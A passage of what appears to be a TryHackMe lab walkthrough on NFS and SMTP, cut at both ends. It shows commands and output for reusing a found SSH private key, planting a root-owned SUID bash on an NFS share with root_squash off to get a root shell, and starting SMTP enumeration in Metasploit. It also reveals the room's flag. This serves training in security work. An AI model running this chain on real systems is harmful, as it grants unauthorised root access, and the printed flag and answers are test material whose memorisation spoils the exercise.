</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>drwx------ <span style="color:#fab387">3</span> ubuntu ubuntu <span style="color:#fab387">4096</span> Apr <span style="color:#fab387">22</span> <span style="color:#fab387">2020</span> .gnupg
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>-rw-r--r-- <span style="color:#fab387">1</span> ubuntu ubuntu <span style="color:#fab387">807</span> Apr <span style="color:#fab387">4</span> <span style="color:#fab387">2018</span> .profile
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>drwx------ <span style="color:#fab387">2</span> ubuntu ubuntu <span style="color:#fab387">4096</span> Apr <span style="color:#fab387">22</span> <span style="color:#fab387">2020</span> .ssh
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>-rw-r--r-- <span style="color:#fab387">1</span> ubuntu ubuntu <span style="color:#fab387">0</span> Apr <span style="color:#fab387">22</span> <span style="color:#fab387">2020</span> .sudo_as_admin_successful</span></span></code></pre></div>
<br>
<p>Which of these keys is most useful to us?</p>






<pre tabindex="0"><code>id_rsa</code></pre>
<p><code>id_rsa</code> is the default name of an SSH identity file.</p>
<br>
<p>Copy this file to a different location your local machine, and change the permission to &ldquo;600&rdquo; using <code>chmod 600 [file]</code>.</p>
<p>Assuming we were right about what type of directory this is, we can pretty easily work out the name of the user this key corresponds to.</p>
<p>Can we log into the machine using <code>ssh -i &lt;key-file&gt; &lt;username&gt;@\&lt;ip&gt; ?</code> (Y/N).</p>






<pre tabindex="0"><code>Y</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>root@ip-10-10-233-18:~# cp /tmp/mount/cappucino/.ssh/id_rsa ~
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>root@ip-10-10-233-18:~# ls
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>burp.json Desktop id_rsa Pictures Rooms thinclient_drives
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span>CTFBuilder Downloads Instructions Postman Scripts Tools
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span>root@ip-10-10-233-18:~# chmod <span style="color:#fab387">600</span> id_rsa
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">6</span><span>root@ip-10-10-233-18:~# ssh -i id_rsa cappucino@10.10.14.167</span></span></code></pre></div>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>Welcome to Ubuntu 18.04.4 LTS <span style="color:#89dceb;font-weight:bold">(</span>GNU/Linux 4.15.0-101-generic x86_64<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>- Documentation: https://help.ubuntu.com
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>- Management: https://landscape.canonical.com
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>- Support: https://ubuntu.com/advantage
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>System information as of Tue Jun <span style="color:#fab387">25</span> 05:47:40 UTC <span style="color:#fab387">2024</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>System load: 0.0 Processes: <span style="color:#fab387">102</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>Usage of /: 45.2% of 9.78GB Users logged in: <span style="color:#fab387">0</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>Memory usage: 16% IP address <span style="color:#cba6f7">for</span> eth0: 10.10.14.167
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>Swap usage: 0%
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span><span style="color:#fab387">44</span> packages can be updated.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span><span style="color:#fab387">0</span> updates are security updates.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span>Last login: Thu Jun <span style="color:#fab387">4</span> 14:37:50 <span style="color:#fab387">2020</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span>cappucino@polonfs:~$</span></span></code></pre></div>
<br>
<h4 id="exploiting-nfs">Exploiting NFS</h4>
<h5 id="what-is-root_squash">What is root_squash?</h5>
<p>By default, on NFS shares- Root Squashing is enabled, and prevents anyone connecting to the NFS share from having root access to the NFS volume. Remote root users are assigned a user nfsnobody when connected, which has the least local privileges. Not what we want. However, if this is turned off, it can allow the creation of SUID bit files, allowing a remote user root access to the connected system.</p>
<h5 id="suid">SUID</h5>
<p>So, what are files with the SUID bit set? Essentially, this means that the file or files can be run with the permissions of the file(s) owner/group. In this case, as the super-user. We can leverage this to get a shell with these privileges!</p>
<p>Due to compatibility reasons, we will obtain the bash executable directly from the target machine.
With the key obtained in the previous task, we can use SCP with the command <code>scp -i key_name username@10.10.14.168:/bin/bash ~/Downloads/bash</code> to download it onto our attacking machine.</p>
<p>Here&rsquo;s a step by step of the actions we&rsquo;re taking, and how they all tie together to allow us to gain a root shell:</p>
<ol>
<li>NFS Access</li>
<li>Gain Low Privilege Shell</li>
<li>Upload Bash Executable to the NFS share</li>
<li>Set SUID Permissions Through NFS Due To Misconfigured Root Squash</li>
<li>Login Through SSH</li>
<li>Execute SUID Bit Bash Executable</li>
<li>Root Access</li>
</ol>
<p>First, change directory to the mount point on your machine, where the NFS share should still be mounted, and then into the user&rsquo;s home directory.</p>






<pre tabindex="0"><code>root@ip-10-10-233-18:/tmp/mount/cappucino#</code></pre>
<br>
<p>Download the bash executable to your Downloads directory. Then use &ldquo;cp ~/Downloads/bash .&rdquo; to copy the bash executable to the NFS share. The copied bash shell must be owned by a root user, you can set this using &ldquo;sudo chown root bash&rdquo;</p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>root@ip-10-10-233-18:/tmp/mount/cappucino/.ssh# scp -i id_rsa cappucino@10.10.14.167:/bin/bash ~/Downloads/bash
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>bash 100% 1087KB 85.0MB/s 00:00
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>root@ip-10-10-233-18:/tmp/mount/cappucino/.ssh# <span style="color:#89dceb">cd</span> ..
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>root@ip-10-10-233-18:/tmp/mount/cappucino# ls
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>root@ip-10-10-233-18:/tmp/mount/cappucino# ls -al
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>total <span style="color:#fab387">36</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>drwxr-xr-x <span style="color:#fab387">5</span> ubuntu ubuntu <span style="color:#fab387">4096</span> Jun <span style="color:#fab387">4</span> <span style="color:#fab387">2020</span> .
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>drwxr-xr-x <span style="color:#fab387">3</span> root root <span style="color:#fab387">4096</span> Apr <span style="color:#fab387">21</span> <span style="color:#fab387">2020</span> ..
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>-rw------- <span style="color:#fab387">1</span> ubuntu ubuntu <span style="color:#fab387">20</span> Jun <span style="color:#fab387">25</span> 07:00 .bash_history
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>-rw-r--r-- <span style="color:#fab387">1</span> ubuntu ubuntu <span style="color:#fab387">220</span> Apr <span style="color:#fab387">4</span> <span style="color:#fab387">2018</span> .bash_logout
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>-rw-r--r-- <span style="color:#fab387">1</span> ubuntu ubuntu <span style="color:#fab387">3771</span> Apr <span style="color:#fab387">4</span> <span style="color:#fab387">2018</span> .bashrc
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>drwx------ <span style="color:#fab387">2</span> ubuntu ubuntu <span style="color:#fab387">4096</span> Apr <span style="color:#fab387">22</span> <span style="color:#fab387">2020</span> .cache
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>drwx------ <span style="color:#fab387">3</span> ubuntu ubuntu <span style="color:#fab387">4096</span> Apr <span style="color:#fab387">22</span> <span style="color:#fab387">2020</span> .gnupg
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>-rw-r--r-- <span style="color:#fab387">1</span> ubuntu ubuntu <span style="color:#fab387">807</span> Apr <span style="color:#fab387">4</span> <span style="color:#fab387">2018</span> .profile
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>drwx------ <span style="color:#fab387">2</span> ubuntu ubuntu <span style="color:#fab387">4096</span> Apr <span style="color:#fab387">22</span> <span style="color:#fab387">2020</span> .ssh
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span>-rw-r--r-- <span style="color:#fab387">1</span> ubuntu ubuntu <span style="color:#fab387">0</span> Apr <span style="color:#fab387">22</span> <span style="color:#fab387">2020</span> .sudo_as_admin_successful
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span>root@ip-10-10-233-18:/tmp/mount/cappucino# cp ~/Downloads/bash .
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span>root@ip-10-10-233-18:/tmp/mount/cappucino# ls
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">19</span><span>bash
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">20</span><span>root@ip-10-10-233-18:/tmp/mount/cappucino# sudo chown root bash</span></span></code></pre></div>
<br>
<p>Now, we&rsquo;re going to add the SUID bit permission to the bash executable we just copied to the share using <code>sudo chmod +[permission] bash</code>. What letter do we use to set the SUID bit set using chmod?</p>






<pre tabindex="0"><code>s</code></pre>
<p>The letter <code>s</code>is used to set the setuid (SUID) bit using the<code>chmod</code>command in Linux:</p>
<ul>
<li>chmod u+s &lt;/path/to/the/file&gt;:Sets the setuid bit symbolically</li>
<li>chmod u-s:Removes the setuid bit</li>
</ul>
<br>
<p>Let&rsquo;s do a sanity check, let&rsquo;s check the permissions of the <code>bash</code> executable using <code>ls -la bash</code>. What does the permission set look like? Make sure that it ends with -sr-x.</p>






<pre tabindex="0"><code>-rwsr-sr-x</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>root@ip-10-10-233-18:/tmp/mount/cappucino# sudo chmod +s bash
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>root@ip-10-10-233-18:/tmp/mount/cappucino# ls -la bash
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>-rwsr-sr-x <span style="color:#fab387">1</span> root root <span style="color:#fab387">1113504</span> Jun <span style="color:#fab387">25</span> 07:04 bash</span></span></code></pre></div>
<br>
<p>Now, SSH into the machine as the user. List the directory to make sure the bash executable is there. Now, the moment of truth. Let&rsquo;s run it with &ldquo;./bash -p&rdquo;. The -p persists the permissions, so that it can run as root with SUID- as otherwise bash will sometimes drop the permissions.</p>
<p>Great! If all&rsquo;s gone well you should have a shell as root! What&rsquo;s the root flag?</p>






<pre tabindex="0"><code>THM{nfs_got_pwned}</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>cappucino@polonfs:~$ ls
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>bash
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>cappucino@polonfs:~$ ./bash -p
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span>bash-4.4# whoami
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span>root</span></span></code></pre></div>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>bash-4.4# whoami
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>root
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>bash-4.4# ls /root
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span>root.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span>bash-4.4# cat /root/root.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">6</span><span>THM<span style="color:#89dceb;font-weight:bold">{</span>nfs_got_pwned<span style="color:#89dceb;font-weight:bold">}</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">7</span><span>bash-4.4#</span></span></code></pre></div>
<br>
<h3 id="smtp-simple-mail-transfer-protocol">SMTP (Simple Mail Transfer Protocol)</h3>
<hr>
<h4 id="understanding-smtp">Understanding SMTP</h4>
<p>The SMTP server performs three basic functions:</p>
<ol>
<li>It verifies who is sending emails through the SMTP server.</li>
<li>It sends the outgoing mail</li>
<li>If the outgoing mail can&rsquo;t be delivered it sends the message back to the sender.</li>
</ol>
<h5 id="pop-and-imap">POP and IMAP</h5>
<p>POP, Post Office Protocol, and IMAP, Internet Message Access Protocol, are both email protocols who are responsible for the transfer of email between a client and a mail server. The main difference is in POP is more simplistic approach of downloading the inbox from the mail server, to the client. Where IMAP will synchronize the current inbox, with the new mail on the server, downloading anything new.</p>
<div style="text-align: center"><img src="./image-25.png"></div>
<br>
<p>What does SMTP stand for?</p>






<pre tabindex="0"><code>Simple Mail Transfer Protocol</code></pre>
<br>
What does SMTP handle the sending of?
```
emails
```
<br>
What is the first step in the SMTP process?






<pre tabindex="0"><code>SMTP handshake</code></pre>
<p>What is the default SMTP port?</p>






<pre tabindex="0"><code>25</code></pre>
<br>
Where does the SMTP server send the email if the recipient's server is not available?






<pre tabindex="0"><code>SMTP Queue</code></pre>
<br>
<p>On what server does the Email ultimately end up on?</p>






<pre tabindex="0"><code>POP/IMAP</code></pre>
<br>
<p>Can a Linux machine run an SMTP server?</p>






<pre tabindex="0"><code>Y</code></pre>
<br>
<p>Can a Windows machine run an SMTP server?</p>






<pre tabindex="0"><code>Y</code></pre>
<br>
<h4 id="enumerating-smtp">Enumerating SMTP</h4>
<p>Poorly configured or vulnerable mail servers can often provide an initial foothold into a network. We want to fingerprint the server to make our targeting as precise as possible before launching an attack. We can use the smtp_version module in Metasploit.</p>
<p>The SMTP service has two internal commands that allow the enumeration of users: VRFY (confirming the names of valid users) and EXPN (which reveals the actual addresses of user&rsquo;s aliases and lists of email). We can do this manually, over a telnet connection  however Metasploit provides a handy module called smtp_enum that will do the legwork for us.</p>
<br>
<p>First, let&rsquo;s run a port scan against the target machine, same as last time. What port is SMTP running on?</p>






<pre tabindex="0"><code>25</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>root@ip-10-10-35-22:~# nmap -sV 10.10.54.3
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>Starting Nmap 7.60 <span style="color:#89dceb;font-weight:bold">(</span> https://nmap.org <span style="color:#89dceb;font-weight:bold">)</span> at 2024-06-26 03:31 BST
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>Nmap scan report <span style="color:#cba6f7">for</span> ip-10-10-54-3.eu-west-1.compute.internal <span style="color:#89dceb;font-weight:bold">(</span>10.10.54.3<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>Host is up <span style="color:#89dceb;font-weight:bold">(</span>0.00069s latency<span style="color:#89dceb;font-weight:bold">)</span>.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>Not shown: <span style="color:#fab387">998</span> closed ports
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>PORT STATE SERVICE VERSION
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span style="color:#89dceb;font-weight:bold">(</span>Ubuntu Linux; protocol 2.0<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>25/tcp open smtp Postfix smtpd
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>MAC Address: 02:4B:FA:CD:BD:EB <span style="color:#89dceb;font-weight:bold">(</span>Unknown<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>Service Info: Host: polosmtp.home; OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>Nmap <span style="color:#cba6f7">done</span>: <span style="color:#fab387">1</span> IP address <span style="color:#89dceb;font-weight:bold">(</span><span style="color:#fab387">1</span> host up<span style="color:#89dceb;font-weight:bold">)</span> scanned in 2.53 seconds</span></span></code></pre></div>
<br>
<p>Okay, now we know what port we should be targeting, let&rsquo;s start up Metasploit. What command do we use to do this?</p>






<pre tabindex="0"><code>msfconsole</code></pre>
<br>
<p>Let&rsquo;s search for the module smtp_version, what&rsquo;s its full module name?</p>






<pre tabindex="0"><code>auxiliary/scanner/smtp/smtp_version</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>msf6 &gt; search smtp_version
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span><span style="color:#6c7086;font-style:italic"># Matching Modules</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span><span style="color:#6c7086;font-style:italic"># Name Disclosure Date Rank Check Description</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>---
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span><span style="color:#fab387">0</span> auxiliary/scanner/smtp/smtp_version normal No SMTP Banner Grabber
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>Interact with a module by name or index. For example info 0, use <span style="color:#fab387">0</span> or use auxiliary/scanner/smtp/smtp_version</span></span></code></pre></div>
<br>
<p>Great, now select the module and list the options. How do we do this?</p>






<pre tabindex="0"><code>options</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>msf6 &gt; use <span style="color:#fab387">0</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>msf6 auxiliary<span style="color:#89dceb;font-weight:bold">(</span>scanner/smtp/smtp_version<span style="color:#89dceb;font-weight:bold">)</span> &gt; options
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>
